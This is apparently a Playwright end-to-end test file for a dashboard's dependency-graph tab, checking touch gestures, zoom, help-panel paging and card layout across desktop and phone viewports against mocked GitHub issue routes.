await check('BL: on a phone held either way the tab holds the page still while it is shown: a finger drawn up or down its head, its tiles, a card\'s tools or the foot, and the wheel, move nothing, and a pinch on its head or its tiles zooms no page; held either way the site\'s header takes none of the screen, hidden above it until its handle brings it, so held sideways the stage takes two fifths of the screen at the least; a phone turned either way brings the tab back between the header and the foot; and another tab lets the page scroll again', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { viewport: { width: 390, height: 844 }, mobile: true, storage: { symphony_panel_graph_focus: JSON.stringify({ 'acme/demo': 'epic-20' }) } });
  const cdp = await context.newCDPSession(page);
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  await sleep(500);
  const seen = {};
  const tryAll = async (what) => {
    const at = await scrollAt(page), moved = [];
    for (const [name, sel] of [['the head', '#tab-dependencies .console__head'], ['the tiles', '#cp-graph-focus'], ['the card\'s tools', '#cp-graph .graph__section:not([hidden]) .graph__tools']]) {
      const p = await midOf(page, sel);
      assert.ok(p, what + ': ' + name + ' is not shown');
      const vh = await page.evaluate(() => innerHeight);
      for (const to of [Math.max(4, p.y - 200), Math.min(vh - 4, p.y + 200)]) {
        await swipe(cdp, p, { x: p.x, y: to }, 8);
        const now = await scrollAt(page);
        if (now.y !== at.y) moved.push(name + ' moved the page from ' + at.y + ' to ' + now.y);
        if (now.y !== at.y) await page.evaluate((y) => window.scrollTo({ top: y, behavior: 'instant' }), at.y);
      }
    }
    const head = await midOf(page, '#tab-dependencies .console__head');
    await page.mouse.move(head.x, head.y);
    await page.mouse.wheel(0, 400);
    await sleep(300);
    const wheeled = await scrollAt(page);
    if (wheeled.y !== at.y) moved.push('the wheel moved the page from ' + at.y + ' to ' + wheeled.y);
    const zoomed = [];
    for (const sel of ['#tab-dependencies .console__head', '#cp-graph-focus']) {
      const p = await midOf(page, sel);
      await pinch(cdp, { x: p.x, y: p.y }, 40, 160);
      zoomed.push((await scrollAt(page)).scale);
    }
    seen[what] = { at, moved, wheeled: wheeled.y, zoomed };
    assert.deepEqual(moved, [], what + ': a touch or the wheel moved the page the tab holds');
    assert.deepEqual(zoomed, [1, 1], what + ': a pinch on the tab\'s head or its tiles zoomed the page');
  };
  await tryAll('390 x 844');
  const upright = await heldOnPhone(page);
  // before each turn the window is put off the rail, as the keyboard's way to the page above the
  // tab would put it, so the turn itself must bring the rail back to the window's top: the page
  // above the rail keeps its height either way up, and nothing else would move the window
  const offRail = () => page.evaluate(() => { window.scrollTo({ top: 0, behavior: 'instant' }); return window.scrollY; });
  const railTop = () => page.evaluate(() => Math.round(document.querySelector('.console__rail').getBoundingClientRect().top));
  // turned sideways: the tab comes back between the header, which hides itself above the window on
  // this page whichever way the phone is held, and the foot
  const offBefore = [await offRail()];
  await page.setViewportSize({ width: 844, height: 390 });
  await sleep(800);
  const sideways = await heldOnPhone(page), stage = await stageAgainstFoot(page), railSideways = await railTop();
  await tryAll('844 x 390');
  // and upright again
  offBefore.push(await offRail());
  await page.setViewportSize({ width: 390, height: 844 });
  await sleep(800);
  const back = await heldOnPhone(page), stageBack = await stageAgainstFoot(page), railBack = await railTop();
  // another tab: the page is no longer held
  await toTab(page, 'board');
  await sleep(300);
  const free = await page.evaluate(() => ({ held: document.documentElement.classList.contains('graph--held'), overflow: getComputedStyle(document.body).overflowY }));
  console.log('     ' + JSON.stringify(seen), '| upright:', JSON.stringify(upright), '| turned sideways:', JSON.stringify(sideways), JSON.stringify(stage), '| upright again:', JSON.stringify(back), JSON.stringify(stageBack), '| the window put off the rail at', JSON.stringify(offBefore), 'and the rail after each turn at', JSON.stringify([railSideways, railBack]), '| the Board tab:', JSON.stringify(free));
  assert.deepEqual(offBefore, [0, 0], 'the window could not be put off the rail before a turn, so this says nothing');
  assert.deepEqual([railSideways, railBack].map((t) => Math.abs(t) <= 1), [true, true], 'a turn did not bring the rail of tabs back to the window\'s top: ' + JSON.stringify([railSideways, railBack]));
  for (const [what, held, st] of [['turned sideways', sideways, stage], ['turned upright again', back, stageBack]]) {
    assert.ok(held.top >= held.header - 1 && held.bottom <= held.foot + 1, what + ': the tab is not back between the header and the foot: ' + JSON.stringify(held));
    assert.ok(st.top >= held.header - 1 && st.bottom <= st.foot + 1, what + ': the stage runs under the header or the foot: ' + JSON.stringify(st));
  }
  // the bar slides above the window, its bottom edge at or over the window's top, rather than going
  // from the page as it did before it hid itself, so the handle can bring it back sideways too
  for (const [what, held] of [['upright', upright], ['turned sideways', sideways], ['upright again', back]]) assert.ok(held.header <= 0, what + ' the site\'s header still takes the screen\'s top: ' + JSON.stringify(held));
  assert.ok(stage.height >= 0.4 * 390, 'held sideways the stage takes less than two fifths of the screen: ' + stage.height + ' px');
  // the tab lets go of the page, which the console itself holds still on a phone on every tab
  // (site branch claude/project-thread-6cxgh2), so nothing scrolls it either way
  assert.equal(free.held, false, 'another tab still holds the page');
  assert.deepEqual(errors, []);
  await context.close();
});

// the tab's help as it is laid out open: its box, the paragraphs shown, its pages
const helpRead = (page) => page.evaluate(() => {
  const tab = document.getElementById('tab-dependencies'), help = tab.querySelector('.console__help'), box = help.querySelector(':scope > div');
  const t = tab.getBoundingClientRect(), b = box.getBoundingClientRect();
  const paras = Array.from(box.querySelectorAll(':scope > p'));
  const shown = paras.filter((p) => !p.hidden && p.getClientRects().length);
  const pager = box.querySelector('.graph__helppager');
  return {
    open: help.open, box: [Math.round(b.left), Math.round(b.top), Math.round(b.right), Math.round(b.bottom)],
    inTab: b.left >= t.left - 1 && b.right <= t.right + 1 && b.top >= t.top - 1 && b.bottom <= t.bottom + 1 && b.bottom <= innerHeight + 1,
    past: [box.scrollWidth - box.clientWidth, box.scrollHeight - box.clientHeight],
    shown: shown.map((p) => paras.indexOf(p)),
    outside: shown.filter((p) => { const r = p.getBoundingClientRect(); return r.left < b.left - 1 || r.right > b.right + 1 || r.top < b.top - 1 || r.bottom > b.bottom + 1; }).map((p) => paras.indexOf(p)),
    paged: !!pager && !pager.hidden, at: pager ? pager.querySelector('.graph__pos').textContent : '', count: paras.length,
    focus: document.activeElement === help.querySelector('summary'),
  };
});
await check('BM: the tab\'s help opens over the tab under its head and never scrolls: at 1366 x 768 at the usual and the largest text size, at 1920 x 1080 and on a phone held either way, every paragraph shown lies inside its box, which holds no more than it shows and lies inside the tab; where they do not all fit at once its arrows and a swipe across it turn its pages, each paragraph on one; and Escape closes it, the keyboard back on its ?', async () => {
  const seen = {};
  for (const [width, height, mobile, up] of [[1366, 768], [1366, 768, false, 5], [1920, 1080], [390, 844, true], [844, 390, true]]) {
    const { context, page, errors } = await open(fixtureRoutes(fixture()), { extraRoutes: [stubRoute], viewport: { width, height }, mobile });
    const cdp = mobile ? await context.newCDPSession(page) : null;
    await signIn(page);
    await waitGraph(page, /^Drawn from 4 reads/, 15000);
    if (up) await textTo(page, '#cp-zoom-up', up);
    const what = width + ' x ' + height + ' at ' + await textSize(page);
    await page.click('#tab-dependencies .console__help > summary');
    await sleep(400);
    const first = await helpRead(page), pages = [first];
    const all = new Set(first.shown);
    // the pages turned by the later arrow, and back by a swipe the other way
    for (let i = 0; first.paged && i < first.count; i++) {
      const next = '#tab-dependencies .graph__helppager .graph__page[data-step="1"]';
      if (await page.$eval(next, (b) => b.disabled)) break;
      await page.click(next);
      await sleep(200);
      const r = await helpRead(page);
      pages.push(r);
      r.shown.forEach((n) => all.add(n));
    }
    let swiped = null;
    if (first.paged) {
      const p = await midOf(page, '#tab-dependencies .console__help > div > p:not([hidden])');
      if (mobile) await swipe(cdp, { x: p.x - 80, y: p.y }, { x: p.x + 80, y: p.y }, 8);
      else await drag(page, { x: p.x - 80, y: p.y }, { x: p.x + 80, y: p.y });
      swiped = await helpRead(page);
    }
    await page.focus('#tab-dependencies .console__help > summary');
    await page.click('#tab-dependencies .console__help > div');
    await page.keyboard.press('Escape');
    await sleep(200);
    const closed = await helpRead(page);
    seen[what] = { pages: pages.map((r) => [r.at, r.shown]), swiped: swiped && swiped.at, closed: [closed.open, closed.focus] };
    for (const r of pages) {
      assert.ok(r.open && r.inTab, what + ': the help does not open inside the tab: ' + JSON.stringify(r));
      assert.ok(r.past[0] <= 1 && r.past[1] <= 1, what + ': the help holds more than its box, by ' + r.past.join(' x '));
      assert.deepEqual(r.outside, [], what + ': a paragraph of the help runs past its box');
      assert.ok(r.shown.length >= 1, what + ': a page of the help shows nothing');
    }
    assert.equal(all.size, first.count, what + ': a paragraph of the help is on no page: ' + JSON.stringify([...all]));
    if (first.paged) assert.ok(swiped.at !== pages[pages.length - 1].at, what + ': a swipe across the help did not turn its page');
    assert.deepEqual([closed.open, closed.focus], [false, true], what + ': Escape did not close the help and give the keyboard back to its ?');
    assert.deepEqual(errors, [], what);
    await context.close();
  }
  console.log('     ' + JSON.stringify(seen));
  assert.ok(Object.values(seen).some((s) => s.pages.length > 1) && Object.values(seen).some((s) => s.pages.length === 1), 'the help was paged everywhere or nowhere, so its pages say nothing');
});

// the list shown as a stage: its table's scale and place, the type it draws, its width beside the list's
const listRead = (page) => page.evaluate(() => {
  const sec = Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden), list = sec.querySelector('.graph__list'), t = list.querySelector('table');
  const m = /translate\(([-0-9.e]+)px, ([-0-9.e]+)px\) scale\(([0-9.e-]+)\)/.exec(t.style.transform) || [];
  const l = list.getBoundingClientRect(), b = t.getBoundingClientRect(), z = list.offsetWidth ? l.width / list.offsetWidth : 1;
  const td = t.querySelector('tbody td:nth-child(2)');
  const zoom = sec.querySelector('.graph__zoom');
  return { k: Number(m[3]), x: Number(m[1]), y: Number(m[2]), box: [list.clientWidth, list.clientHeight], table: [t.offsetWidth, t.offsetHeight],
    inside: b.left >= l.left - 1 && b.right <= l.right + 1 && b.top >= l.top - 1 && b.bottom <= l.bottom + 1,
    px: Math.round(parseFloat(getComputedStyle(td).fontSize) * Number(m[3]) * z * 10) / 10,
    zoomShown: getComputedStyle(zoom).visibility !== 'hidden' && getComputedStyle(zoom).display !== 'none',
    // the scale the list's rows would take as a table laid out at the list's own width, as before it
    // chose a form, fitted whole to the part of the list the card's tools leave, as the stage fits it
    atOwn: (() => {
      const was = { w: t.style.width, cols: t.style.getPropertyValue('--gcols'), cards: list.classList.contains('graph__list--cards') };
      list.classList.remove('graph__list--cards');
      t.style.setProperty('--gcols', '1');
      t.style.width = Math.max(1, list.clientWidth - 24) + 'px';
      const tw = t.offsetWidth, th = t.offsetHeight;
      list.classList.toggle('graph__list--cards', was.cards);
      t.style.setProperty('--gcols', was.cols);
      t.style.width = was.w;
      const tools = sec.querySelector('.graph__tools'), floating = tools && getComputedStyle(tools).position === 'absolute' ? tools.getBoundingClientRect() : null;
      const corner = floating && !(floating.right <= l.left || floating.bottom <= l.top || floating.left >= l.right || floating.top >= l.bottom)
        ? { w: (floating.right - l.left) / z - list.clientLeft + 4, h: (floating.bottom - l.top) / z - list.clientTop + 4 } : null;
      const W = list.clientWidth, H = list.clientHeight;
      const fit = (r) => (r.w > 24 && r.h > 24 ? Math.min((r.w - 24) / tw, (r.h - 24) / th, 1) : 0);
      return corner ? Math.max(fit({ w: W, h: H - corner.h }), fit({ w: W - corner.w, h: H })) : fit({ w: W, h: H });
    })(),
    scale: window.visualViewport ? window.visualViewport.scale : 1 };
});
await check('BN: a card\'s list is a stage of its own, as its chart is: its table laid out at the width that draws its rows largest and fitted whole, zoomed in by its + and the wheel on a laptop and a pinch on a phone, panned by a drag, and drawn whole again by Whole chart, the page never zooming; for a twelve-row list at 1366 x 768 and on a phone held either way, and where its box is wider than tall, as on a phone held sideways, its words drawn larger than at the list\'s own width where that is too small to read', async () => {
  const seen = {};
  for (const [width, height, mobile] of [[1366, 768], [390, 844, true], [844, 390, true]]) {
    const what = width + ' x ' + height;
    const { context, page, errors } = await open(wideRoutes(), { viewport: { width, height }, mobile, storage: { symphony_panel_graph_focus: JSON.stringify({ 'acme/demo': 'epic-70' }) } });
    const cdp = mobile ? await context.newCDPSession(page) : null;
    await signIn(page);
    await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
    await waitGraph(page, /^Drawn from 1 read/, 15000);
    await page.click('#cp-graph .graph__section:not([hidden]) .graph__view[data-view="list"]');
    await sleep(500);
    const whole = await listRead(page);
    const mid = await midOf(page, '#cp-graph .graph__section:not([hidden]) .graph__list');
    let zoomed;
    if (mobile) { await pinch(cdp, mid, 60, 180); zoomed = await listRead(page); }
    else {
      await page.click(ZOOM_IN);
      await sleep(400);
      const plus = await listRead(page);
      await page.mouse.move(mid.x, mid.y);
      await page.mouse.wheel(0, -200);
      await sleep(300);
      zoomed = await listRead(page);
      assert.ok(near1(plus.k / whole.k, 1.4), what + ': the list\'s + did not zoom it in: ' + plus.k);
    }
    // a drag on the zoomed list from its middle moves it
    if (mobile) await swipe(cdp, mid, { x: mid.x - 40, y: mid.y - 30 }, 8);
    else await drag(page, mid, { x: mid.x - 40, y: mid.y - 30 });
    const panned = await listRead(page);
    await page.click('#cp-graph .graph__section:not([hidden]) .graph__fit');
    await sleep(500);
    const back = await listRead(page);
    seen[what] = { whole: [whole.k, whole.px, Math.round(whole.atOwn * 1000) / 1000, whole.table, whole.box], zoomed: zoomed.k, panned: [panned.x - zoomed.x, panned.y - zoomed.y], back: back.k, page: zoomed.scale };
    assert.ok(whole.inside && whole.k <= 1, what + ': the list is not fitted whole: ' + JSON.stringify(whole));
    assert.ok(whole.k >= whole.atOwn - 1e-3, what + ': the list is drawn smaller than at its own width: ' + JSON.stringify([whole.k, whole.atOwn]));
    assert.equal(whole.zoomShown, true, what + ': the zoom\'s buttons are not shown with the list');
    assert.ok(zoomed.k > whole.k * 1.3, what + ': the list was not zoomed in: ' + zoomed.k);
    assert.equal(zoomed.scale, 1, what + ': the page zoomed, not the list');
    assert.ok(Math.abs(panned.x - zoomed.x) > 10 || Math.abs(panned.y - zoomed.y) > 10, what + ': a drag did not move the zoomed list');
    assert.ok(near1(back.k, whole.k, 1e-3) && back.inside, what + ': Whole chart did not draw the list whole again');
    // a box wider than tall, as a phone's held sideways, lays the rows out wider, each on fewer lines
    if (whole.box[0] > whole.box[1] && whole.atOwn < 0.6) assert.ok(whole.k > whole.atOwn * 1.2, what + ': the list\'s words are drawn as small as at its own width: ' + JSON.stringify([whole.k, whole.atOwn]));
    assert.deepEqual(errors, [], what);
    await context.close();
  }
  console.log('     ' + JSON.stringify(seen));
  assert.ok(Object.values(seen).some((s) => s.whole[2] < 0.6 && s.whole[4][0] > s.whole[4][1]), 'no list wider than tall was too small at its own width, so the width chosen says nothing');
});

// an epic whose first task has a title of four hundred characters and blocks five others
const LONG_TITLE = Array.from({ length: 8 }, (_, i) => 'Part ' + (i + 1) + ' of a very long task title that runs on and on').join(', ') + ' and still more words past them';
function hubRoutes() {
  const hub = issue(51, LONG_TITLE, ['claimed', 'worker:alice']);
  const rest = Array.from({ length: 5 }, (_, i) => issue(52 + i, 'Waits on the hub ' + (i + 1), ['todo'], deps(1, 1)));
  const routes = baseRoutes('acme/demo', [issue(50, 'A hub', ['epic'], subs(0, 6)), hub].concat(rest));
  routes['GET /repos/acme/demo/issues/50/sub_issues'] = [hub].concat(rest);
  for (const r of rest) routes['GET /repos/acme/demo/issues/' + r.number + '/dependencies/blocked_by'] = [hub];
  return routes;
}
// the focus's card as drawn: whether its head and its actions lie inside it, its title's place and
// tooltip, its actions above its title, the floating tools against it, and its neighbours' buttons
const cardRead = (page) => page.evaluate(() => {
  const sec = Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden), card = sec.querySelector('.graph__near'), c = card.getBoundingClientRect();
  const inside = (e) => { const r = e.getBoundingClientRect(); return r.width > 0 && r.left >= c.left - 1 && r.right <= c.right + 1 && r.top >= c.top - 1 && r.bottom <= c.bottom + 1; };
  const title = card.querySelector('.graph__neartitle'), tools = sec.querySelector('.graph__tools'), t = tools.getBoundingClientRect();
  const floats = getComputedStyle(tools).position === 'absolute';
  return {
    head: inside(card.querySelector('.graph__nearhead')), link: inside(card.querySelector('.graph__nearacts a')), centre: inside(card.querySelector('.graph__nearacts button')),
    title: inside(title), cut: title.classList.contains('graph__neartitle--cut'), tooltip: title.getAttribute('title') === title.textContent,
    above: card.querySelector('.graph__nearacts').getBoundingClientRect().bottom <= title.getBoundingClientRect().top + 1,
    over: floats && !(t.right <= c.left || t.left >= c.right || t.bottom <= c.top || t.top >= c.bottom),
    floats, to: Array.from(card.querySelectorAll('button.graph__nearto')).map((b) => b.textContent),
    away: card.querySelector('.graph__nearrel').classList.contains('graph__nearrel--away'),
    // where the card lies under the stage, as on a phone held upright, the heights the two share
    under: c.top >= sec.querySelector('.control__chart').getBoundingClientRect().bottom - 1, h: Math.round(c.height), stage: Math.round(sec.querySelector('.control__chart').getBoundingClientRect().height),
  };
});
await check('BO: a focus\'s card never cuts its state, its link or Centre its row: with a title of four hundred characters, beside the stage on a phone held sideways, under it on a phone held upright, where it takes half their room at the most, and at 1366 x 540 at the largest text size, they lie inside the card, the link and Centre its row above the title, which lies inside it too and gives way first, cut only where it must with its whole in its tooltip; in the short form the floating tools never lie over the card; and every neighbour the card names is a button, from the keyboard too, in sight while it has the keyboard, that moves the focus to it', async () => {
  const seen = {};
  // the largest text size at 1366 x 540, where the long title must be cut: at 1366 x 768 the card
  // has had the room for it whole since the foot and the Ask Claude bar went on 2026-10-20
  for (const [width, height, mobile, up] of [[844, 390, true], [390, 844, true], [1366, 540, false, 5], [1366, 768]]) {
    const { context, page, errors } = await open(hubRoutes(), { viewport: { width, height }, mobile });
    await signIn(page);
    await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
    await waitGraph(page, /^Drawn from 6 reads/, 15000);
    if (up) await textTo(page, '#cp-zoom-up', up);
    const what = width + ' x ' + height + ' at ' + await textSize(page);
    await sleep(300);
    const p = await nodeAt(page, 51);
    if (mobile) await page.touchscreen.tap(p.x, p.y); else await page.mouse.click(p.x, p.y);
    await waitNear(page, 51);
    await sleep(400);
    const card = await cardRead(page);
    // the last neighbour's button reached from the keyboard, shown while it has it, and pressed
    await page.focus('#cp-graph .graph__section:not([hidden]) .graph__near button.graph__nearto:last-of-type');
    // shown is seen, not laid out: a box clipped out of sight keeps its size, so the point at the
    // button's middle must be the button's
    const keyed = await page.evaluate(() => {
      const b = document.activeElement, r = b.getBoundingClientRect(), c = b.closest('.graph__near').getBoundingClientRect(), hit = document.elementFromPoint(r.left + r.width / 2, r.top + r.height / 2);
      return { text: b.textContent, shown: r.width > 4 && r.height > 4 && r.top >= c.top - 1 && r.bottom <= c.bottom + 1 && !!hit && (hit === b || b.contains(hit)) };
    });
    await page.keyboard.press('Enter');
    await waitNear(page, 56).catch(() => {});
    const moved = await nearRead(page);
    seen[what] = { card, keyed, moved: moved.num };
    assert.deepEqual([card.head, card.link, card.centre], [true, true, true], what + ': the card cuts its state, its link or Centre its row: ' + JSON.stringify(card));
    assert.equal(card.title, true, what + ': the title runs past the card');
    assert.equal(card.above, true, what + ': the link and Centre its row do not stand above the title, where a title of any length leaves them in sight');
    if (card.cut) assert.equal(card.tooltip, true, what + ': the title is cut with no tooltip that holds it whole');
    assert.equal(card.over, false, what + ': the card\'s floating tools lie over the focus\'s card');
    if (card.under) assert.ok(card.h <= card.stage + 12, what + ': the card under the stage takes more than half their room: ' + JSON.stringify([card.h, card.stage]));
    assert.deepEqual(card.to, ['#52', '#53', '#54', '#55', '#56'], what + ': the card does not name each neighbour as a button');
    assert.deepEqual([keyed.text, keyed.shown, moved.num], ['#56', true, '#56'], what + ': the keyboard did not reach the last neighbour in sight and move the focus to it');
    assert.deepEqual(errors, [], what);
    await context.close();
  }
  console.log('     ' + JSON.stringify(seen));
  assert.ok(Object.values(seen).some((s) => s.card.floats), 'no screen floated the card\'s tools, so their place says nothing');
  assert.ok(Object.values(seen).some((s) => s.card.cut) && Object.values(seen).some((s) => !s.card.cut), 'the long title was cut everywhere or nowhere, so its fit says nothing');
  assert.ok(Object.values(seen).some((s) => s.card.away), 'no card put the arrows\' words out of sight, so the keyboard\'s reach into them says nothing');
  assert.ok(Object.values(seen).some((s) => s.card.under), 'no card lay under its stage, so the room the two share says nothing');
});

await check('BP: the mouse zooms about its pointer: the wheel keeps the point under the pointer there at every step, while the zoomed chart still fits its stage too; a wheel that counts lines, as Firefox\'s does, zooms as one that counts pixels does; a double click a little slower than the usual, 350 and 450 ms between its clicks, zooms in about its point and opens no focus; a right click on a node opens nothing; and Ctrl with + is the browser\'s, which leaves the chart as it is', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { viewport: { width: 1920, height: 1080 }, storage: { symphony_panel_graph_focus: JSON.stringify({ 'acme/demo': 'epic-20' }) } });
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  await sleep(400);
  const whole = await stageRead(page);
  // the wheel over #22, off the stage's middle, in three steps: #22 stays under the pointer
  const p = await nodeAt(page, 22);
  await page.mouse.move(p.x, p.y);
  const drift = [];
  for (let i = 0; i < 3; i++) {
    await page.mouse.wheel(0, -60);
    await sleep(150);
    const q = await nodeAt(page, 22);
    drift.push(Math.round(Math.hypot(q.x - p.x, q.y - p.y) * 10) / 10);
  }
  const wheeled = await stageRead(page);
  // a wheel in lines, three of them, against one in pixels, forty-eight, from the whole chart
  const byWheel = async (mode, delta) => {
    await page.click('#cp-graph .graph__section:not([hidden]) .graph__fit');
    await sleep(400);
    const m = await stageMid(page);
    await page.evaluate(({ m, mode, delta }) => {
      const host = Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden).querySelector('.control__chart');
      host.dispatchEvent(new WheelEvent('wheel', { deltaY: delta, deltaMode: mode, clientX: m.x, clientY: m.y, bubbles: true, cancelable: true }));
    }, { m, mode, delta });
    await sleep(300);
    return (await stageRead(page)).k;
  };
  const lines = await byWheel(1, -3), pixels = await byWheel(0, -48);
  // slow double clicks on #22: each zooms in about its point and opens no focus
  const slow = [];
  for (const gap of [350, 450]) {
    await page.click('#cp-graph .graph__section:not([hidden]) .graph__fit');
    await sleep(500);
    const n = await nodeAt(page, 22);
    const before = await stageRead(page);
    await page.mouse.move(n.x, n.y);
    await page.mouse.down();
    await page.mouse.up();
    await sleep(gap);
    await page.mouse.down({ clickCount: 2 });
    await page.mouse.up({ clickCount: 2 });
    await sleep(800);
    const after = await stageRead(page), at = await nodeAt(page, 22);
    slow.push({ gap, k: Math.round(after.k / before.k * 1000) / 1000, near: after.near, drift: Math.round(Math.hypot(at.x - n.x, at.y - n.y)) });
  }
  // a right click on #22, and Ctrl with + on the stage
  await page.click('#cp-graph .graph__section:not([hidden]) .graph__fit');
  await sleep(500);
  const r = await nodeAt(page, 22);
  await page.mouse.click(r.x, r.y, { button: 'right' });
  await sleep(800);
  const right = await nearRead(page);
  await page.focus(STAGE_SHOWN);
  const k0 = (await stageRead(page)).k;
  // each read alone, since a + and a - the stage took would undo each other
  await page.keyboard.press('Control+Equal');
  await sleep(400);
  const k1 = (await stageRead(page)).k;
  await page.keyboard.press('Control+Minus');
  await sleep(400);
  const k2 = (await stageRead(page)).k;
  console.log('     whole:', whole.k, '| #22 off the pointer after each step of the wheel:', JSON.stringify(drift), wheeled.k, '| three lines:', lines, 'forty-eight pixels:', pixels, '| slow double clicks:', JSON.stringify(slow), '| a right click:', right.open, '| Ctrl with + and -:', JSON.stringify([k0, k1, k2]));
  assert.ok(wheeled.k > whole.k * 1.2, 'the wheel did not zoom in');
  assert.ok(drift.every((d) => d <= 1.5), 'the wheel did not keep #22 under the pointer: ' + JSON.stringify(drift));
  assert.ok(lines > whole.k * 1.05 && near1(lines, pixels, 1e-3), 'a wheel in lines did not zoom as one in pixels: ' + JSON.stringify([lines, pixels]));
  for (const s of slow) assert.ok(near1(s.k, 2, 0.02) && !s.near && s.drift <= 2, 'a double click ' + s.gap + ' ms slow did not zoom in about its point, or opened a focus: ' + JSON.stringify(s));
  assert.equal(right.open, false, 'a right click opened the node in focus');
  assert.ok(near1(k0, k1, 1e-6) && near1(k0, k2, 1e-6), 'Ctrl with + or - zoomed the chart: ' + JSON.stringify([k0, k1, k2]));
  assert.deepEqual(errors, []);
  await context.close();
});

await check('BQ: a chart is drawn in whichever of its two layouts, top to bottom or left to right, its stage draws larger: the goals over six epics, wide top to bottom on a monitor, stand left to right and larger on a phone held upright; and a node with many neighbours, the goal over its six epics, comes up a quarter larger at the least in its focus than in the whole chart, at 1280 x 800, 1440 x 900 and on a phone', async () => {
  const seen = {};
  for (const [width, height, mobile] of [[1920, 1080], [1280, 800], [1440, 900], [390, 844, true]]) {
    const what = width + ' x ' + height;
    const { context, page, errors } = await open(manyRoutes(6), { viewport: { width, height }, mobile });
    await signIn(page);
    await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
    await waitGraph(page, /^Drawn from 7 reads/, 30000);
    await pick(page, 'goals');
    await sleep(500);
    const whole = await stageRead(page), w1 = whole.nodes.find((g) => g.n === 1);
    const p = await nodeAt(page, 1);
    if (mobile) await page.touchscreen.tap(p.x, p.y); else await page.mouse.click(p.x, p.y);
    await waitNear(page, 1);
    await sleep(400);
    const focus = await stageRead(page), f1 = focus.nodes.find((g) => g.n === 1);
    seen[what] = { face: [whole.w, whole.h], k: whole.k, box: whole.box, grew: Math.round((f1.r - f1.l) / (w1.r - w1.l) * 100) / 100, focus: focus.k };
    assertWhole(whole, what + ', the goals');
    assertFocus(focus, what + ', the goal\'s focus', whole.k);
    assert.ok(seen[what].grew >= NEAR_GROW - 0.02, what + ': the goal is not drawn a quarter larger in its focus: ' + seen[what].grew);
    assert.deepEqual(errors, [], what);
    await context.close();
  }
  console.log('     ' + JSON.stringify(seen));
  const wide = seen['1920 x 1080'], phone = seen['390 x 844'];
  assert.ok(wide.face[0] > wide.face[1], 'on the monitor the goals are not drawn top to bottom, wider than tall');
  assert.ok(phone.face[1] > phone.face[0], 'on the phone the goals are not turned left to right, taller than wide');
  const asWide = Math.min((phone.box[0] - 24) / wide.face[0], (phone.box[1] - 24) / wide.face[1], 1);
  assert.ok(phone.k > asWide * 1.2, 'turned, the goals are not drawn larger on the phone than top to bottom: ' + JSON.stringify([phone.k, asWide]));
});

await check('BR: on a phone: the finger left after a pinch pans the chart it zoomed; a finger\'s press gives the stage the keyboard with no ring, the first tap on a page opened at its address too, while the keyboard\'s own way to it draws one; two quick taps on two nodes apart are two presses, the second opening its node, and no zoom; a tap on the line of what was drawn shows it whole and another cuts it again; and leaving a focus by Previous brings the tiles back', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { viewport: { width: 390, height: 844 }, mobile: true, storage: { symphony_panel_graph_focus: JSON.stringify({ 'acme/demo': 'epic-20' }) } });
  const cdp = await context.newCDPSession(page);
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  await sleep(400);
  const whole = await stageRead(page), m = await stageMid(page);
  // a pinch out, then one finger lifted and the other drawn up and to the left. Chrome's touch
  // emulation lifts no finger alone (a move or a start that leaves one out keeps it down, and an end
  // lifts them all), so the first finger's lift is its pointerup, given the stage as the browser
  // would give it, and the other carries on as Chrome's own touch
  await page.evaluate(() => {
    const h = Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden).querySelector('.control__chart');
    window.__downs = [];
    h.addEventListener('pointerdown', (e) => window.__downs.push({ id: e.pointerId, x: e.clientX, y: e.clientY }), true);
  });
  const at = (d) => [{ x: m.x - d / 2, y: m.y }, { x: m.x + d / 2, y: m.y }];
  await touchesAt(cdp, 'touchStart', at(60));
  for (let i = 1; i <= 8; i++) await touchesAt(cdp, 'touchMove', at(60 + 140 * i / 8));
  const last = at(200)[1], first = at(200)[0];
  await page.evaluate((p) => {
    const h = Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden).querySelector('.control__chart'), d = window.__downs[0];
    h.dispatchEvent(new PointerEvent('pointerup', { pointerId: d.id, pointerType: 'touch', isPrimary: true, clientX: p.x, clientY: p.y, bubbles: true, cancelable: true }));
  }, first);
  await sleep(100);
  const pinched = await stageRead(page);
  for (let i = 1; i <= 8; i++) await cdp.send('Input.dispatchTouchEvent', { type: 'touchMove', touchPoints: [{ x: last.x - 50 * i / 8, y: last.y - 40 * i / 8, id: 1 }] });
  await cdp.send('Input.dispatchTouchEvent', { type: 'touchEnd', touchPoints: [] });
  await sleep(300);
  const panned = await stageRead(page);
  const ringRead = (pg) => pg.evaluate(() => { const h = document.activeElement; return { stage: h.classList.contains('control__chart'), outline: getComputedStyle(h).outlineStyle, keyboards: h.matches(':focus-visible') }; });
  const ring = await ringRead(page);
  // the keyboard's way to the stage: Tab on from Whole chart, past the card's tools that can take it
  await page.click('#cp-graph .graph__section:not([hidden]) .graph__fit');
  await sleep(400);
  await page.focus('#cp-graph .graph__section:not([hidden]) .graph__fit');
  for (let i = 0; i < 5 && !await page.evaluate(() => document.activeElement.classList.contains('control__chart')); i++) await page.keyboard.press('Tab');
  const keyed = await page.evaluate(() => { const h = document.activeElement; return { stage: h.classList.contains('control__chart'), outline: getComputedStyle(h).outlineStyle }; });
  // two quick taps on #22 and #23, apart
  const a = await nodeAt(page, 22), b = await nodeAt(page, 23);
  await page.touchscreen.tap(a.x, a.y);
  await sleep(80);
  await page.touchscreen.tap(b.x, b.y);
  await waitNear(page, 23).catch(() => {});
  await sleep(300);
  const two = await nearRead(page);
  // the line of what was drawn, tapped twice
  const line = await midOf(page, '#cp-graph-state');
